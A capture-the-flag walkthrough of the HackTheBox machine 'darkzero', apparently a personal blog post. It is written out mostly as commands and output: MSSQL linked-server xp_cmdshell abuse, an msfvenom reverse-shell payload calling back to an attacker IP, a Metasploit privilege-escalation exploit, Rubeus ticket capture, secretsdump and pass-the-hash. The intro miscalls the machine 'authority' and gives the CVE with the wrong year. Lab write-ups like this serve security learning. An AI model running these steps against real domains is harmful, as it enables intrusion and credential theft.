---
categories:
- CTF
layout: post
image:
  path: preview.png
media_subpath: /assets/posts/2025-09-07-darkzero-hackthebox
tags:
- hackthebox
- windows
- ad
- cve
- trusts
- mssql


title: darkzero @ HackTheBox
---
Darkzero is a hard-difficulty machine on [hackthebox.eu](https://www.hackthebox.eu). We are given starting creds for john.w. Initial access is gained by exploiting a misconfiguration inside mssql where we can enable xp_cmdshell on dc02, this allows us to gain a reverse shell as the sql user on dc02. Once a shell has been obtained, we can exploit cve-2025-30088 to gain full administrator privileges on dc02. Once we have obtained administrator privileges, we can run Rubeus in monitor mode and access a fake share to obtain a dc01 ticket, saving this ticket and using impackets ticker converter, we are able to perform a pass-the-hash attack to gain administrator on dc01.

## User & Root Flag

This post is a walkthrough for authority, a medium machine on [hackthebox.eu](https://www.hackthebox.eu). <br>
The initial scan (`nmap -Pn -n -sCV 10.10.11.89`) shows the following results:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-07 13:44 BST
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 7.69% done; ETC: 13:46 (0:01:12 remaining)
Nmap scan report for darkzero.htb (10.10.11.89)
Host is up (0.12s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-07 19:45:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RC0+
|_ssl-date: 2025-10-07T19:46:39+00:00; +7h00m00s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-07T18:49:49
|_Not valid after:  2055-10-07T18:49:49
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
| smb2-time: 
|   date: 2025-10-07T19:45:59
|_  start_date: N/A
```

SMB shares provide no useful information.
```
┌──(ap3ili@Coffee)-[~/Documents/ctf/darkzero]
└─> smbmap -u john.w -p 'RFulUtONCOL!' -H 10.10.11.89

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.11.89:445 Name: darkzero.htb              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share
```

## User
whilst we have valid credentials, we can try accessing mssql which is successful.
```
mssqlclient.py john.w:'RFulUtONCOL!'@10.10.11.89 -windows-auth
/home/ap3ili/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> 
```
`SIDE NOTE` MAKE SURE TO HAVE THIS MSSQL SHELL ON THE SIDE FOR LATER (THANK ME LATER)
Using enum_links, we find that we are linked to a server.
```
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc  
```
To exploit this; we can follow this guide: https://www.bordergate.co.uk/attacking-mssql/ (Skip to `Linked Server Exploitation`)

We can enable xp_cmdshell on dc02 with the following command:
```
SQL (darkzero\john.w  guest@master)> EXEC ('exec master.dbo.sp_configure ''show advanced options'',1;RECONFIGURE;exec master.dbo.sp_configure ''xp_cmdshell'', 1;RECONFIGURE;') AT [DC02.darkzero.ext];
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```

Once we have confirmed that xp_cmdshell has been enabled, we can get a reverse shell with a b64 encoded ps1 script. 
`NOTE`
I HIGHLY suggest using the "base64" powershell script #3 as manually encoding for some reason didn't work for me.
![capture-0](capture-00.PNG)

Once you have your reverse shell, set up a listener and obtain that shell!
![capture-2](capture-01.PNG)

## DC02 Access
At this point, things get a little messy..
First; generate a msfvenom reverse shell<br>
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.79 LPORT=3333 -f exe -o reverse.exe`<br>
<br>Next, upload that to your machine and then set up a listener using `msfconsole`.
```
use multi/handler
set payload set payload windows/x64/meterpreter/reverse_tcp
< set your LHOST & LPORT >
```
Get a remote meterpreter shell before this next step.
Personally, I migrated my shell just for ease of use, I'm not 100% sure if this is required but I did it anyways since we're about to launch a nuke.
```
msf post(windows/manage/migrate) > show options

Module options (post/windows/manage/migrate):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   KILL       false            no        Kill original process for the session.
   NAME                        no        Name of process to migrate to.
   PID        0                no        PID of process to migrate to.
   PPID       0                no        Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing).
   PPID_NAME                   no        Name of process for PPID spoofing when creating a new process.
   SESSION                     yes       The session to run this module on
   SPAWN      true             no        Spawn process to migrate to. If set, notepad.exe is used.
```
Once you have migrated (optinal, maybe, idk.) run the following exploit on your current session.
Next, use `cve_2024_30088_authz_basep` and set your session.
After that, launch that cve to obtain administrator on dc02.
```
msf exploit(windows/local/cve_2024_30088_authz_basep) > run
[-] Handler failed to bind to 192.168.15.12:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
[*] Reflectively injecting the DLL into 7088...
```

If things go well, you should have a shell! if not, re-do the steps, make sure you have the right payload settings and/or set up another handler on a different port.
## Root
To obtain the root flag, we first have to upload Rubeus, this is because there is a trust between dc01 and dc02.
After uploading Rubeus, run it in monitor mode to capture tickets.
You'll see something like this:
```
Rubeus.exe monitor /interval:5 /nowrap
[*] 10/8/2025 1:05:18 AM UTC - Found new TGT:

  User                  :  DC02$@DARKZERO.EXT
  StartTime             :  10/7/2025 5:44:11 PM
  EndTime               :  10/8/2025 3:29:54 AM
  RenewTill             :  10/14/2025 5:29:54 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwardable
  Base64EncodedTicket   :

    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IEVDCCBFCgAwIBEqEDAgEBooIEQgSCBD7+g1/ge+1szmxDKm6xaCrvY6qxBrg25dR02GoHky9xQvKEPfjwb8e6S3/Ru54rEp5sygWRkr3TTJkTg6+s9pGdpXhYxK+yo3ClCVtZXLZpborTjpoNDDDHyMXN/kSRm1c5DdSy8l99ucmSXxuLwOPlpafARFiqtDkZYsXmecKoequyM9On+wK8fDq8XNv0kW+UUmoxZCROkwdNQMstiN7kedSirxYepLAUt9Zdc5GUgCwFJ9P9kesoXuywcX+mDK23mhWv7cWlHxxHtqkMlKSbp5z9Y+79xtIoEnOb0HjqbTJtCFLeZmQJ6RD4aXBwOxOjKHzOmhSUjW/eaGZ3s/ZFZTJzLmrr892Rix0WSM14LzrhvGNmbc1896CYyqZpnS0GVzPOl4gGmf17WU0buKb9doVTIgq9XreFhjoVsnw+2StCOpbOtICxYPWhZw+uksdsswvndDaqCrNc3WTD0nX0KbkyKI+7X8wxA696bEVrMN6GuEdl+IOmR+yk5Pb2BLxmdbZ/ANKyfiSvkeODKH5fevZbWFryLDdae5n6SCzUBP0mCNJyiLRAOHR94zHo1qDpfy8+UtPwVvDzpbSihfTcIPX+tSHeLd6Tt9Xt7Utkgi7XFhFRThV2n7R5m5naUYcOIVGTwAE/+Lzs/E0vSRTnoqyHI/vKrxg7vntAR33gbMwvUtEk0tG6C7FGq4LTfr0nAJEHtIZIGpNWIAjhZKDlTnLND7aT9vvpGkt0hRDsownneQUlllaUJ/oiep8HcoxNBYPSNcE9+UScTVoA+5YhNQHIIaVIRMazXX8WYUjFPoake0WU9iMkcOw8wzPOuainu5nK+D6Nt2h45R/pOUvTKVkdMHy0HCYivMN7XLyk5vawqV/qtOoZQCLnSSnKKhZcRsoA1nbbOixm4sh2c9SG4Uy/QhEI1R2fhWc0lcoLK7vzXIC1pjIrxTvGFcLCzAl7KDllT7cqdXWccBLMe8uHneIsCuuWvKgnhmL9yPG6l3Zj7IGd3TgvKWzUfluSeF+Pu/wi1KK6uHA65IsWVM+UXMrXuN6cEUTSAu+elXwP9cTCq2JOQ/16z8LF8f320NekZOgD7Re4M5T/I+vXMNex/0evHCCu4mGgApKxkhTCy8umR40j9s7zBRQoxIr7tz0J6+Z7dRxjvrc7y1fWbFPoCxI8dGJR3iCodG6mXXQzFrgJl+7WF4FjjiOVpzxiZQLBxWsIHNhgPgeUw5XEKjZc6M354O1XxclODDfjHP5opgM81T/epvJp93mAMdlTa3dPujdrJp+pS0lw6YiOlb912qgzgYZ0BCkAY1prPuFW7BOP8s9MjhoYCPrew3E+TwzJ/zq0FRgE2SvibeXXajKjFQvj9C6ImyYySvjSL539KclZDx26UXjr1ex6FSHUOInO+i2IZnLs8tCAGsNJJ3qAJo3kjSnz4uCsXxX9sgmjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCBOV/ZEKrvK1mEJTrBL5TY0sl/8sp5kI/oaqPsnajrdYaEOGwxEQVJLWkVSTy5FWFSiEjAQoAMCAQGhCTAHGwVEQzAyJKMHAwUAQKEAAKURGA8yMDI1MTAwODAwNDQxMVqmERgPMjAyNTEwMDgxMDI5NTRapxEYDzIwMjUxMDE1MDAyOTU0WqgOGwxEQVJLWkVSTy5FWFSpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDERBUktaRVJPLkhUQg==
```

Now going back to our original mssql connection, execute a remote smb share connection to obtain a dc01 ticket.
Using `xp_dirtree` we can execute a fake smbshare to obtain a dc01 ticket.
```
xp_dirtree \\DC02.darkzero.ext\share
[*] 10/8/2025 1:07:42 AM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/7/2025 6:07:38 PM
  EndTime               :  10/8/2025 4:07:38 AM
  RenewTill             :  10/14/2025 6:07:38 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDZ6PyC04TcCjX7de0cXvogcqXvSfzcLLENAKK/rasey+jtPZrs+KhBy6fiH2ru/XJCp86YyyVF7ct8mU1XW9EXaQ1I
    <SNIP>
```

Paste this b64 encoded ticket into a file, base64 decode it into kirbi, then use impackets ticket converter to create a dc01.ccache
```
┌──(tsunami@coffee)-[~/Documents/darkzero]
└─> nano ticket.b64
                                                                                                                                                                                                                                            
┌──(tsunami@coffee)-[~/Documents/darkzero]
└─> base64 -d ticket.b64 > dc01.kirbi
                                                                                                                                                                                                                                            
┌──(tsunami@coffee)-[~/Documents/darkzero]
└─> impacket-ticketConverter dc01.kirbi dc01.ccache
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

Next, use secretsdump to dump the domain controllers hashes and perform a pass-the-hash to obtain root.
```
impacket-secretsdump -k -no-pass -just-dc-user administrator "DARKZERO.HTB/dc01\$@dc01.darkzero.htb"
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:<SNIP>
[*] Kerberos keys grabbed
Administrator:<SNIP>
Administrator:<SNIP>
Administrator:<SNIP>
Administrator:<SNIP>
Administrator:<SNIP>
[*] Cleaning up..
```

PTH
```
┌──(tsunami@coffee)-[~/Documents/darkzero]
└─> impacket-wmiexec 'DARKZERO.HTB/administrator'@10.129.80.138  -hashes '<SNIP>' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
```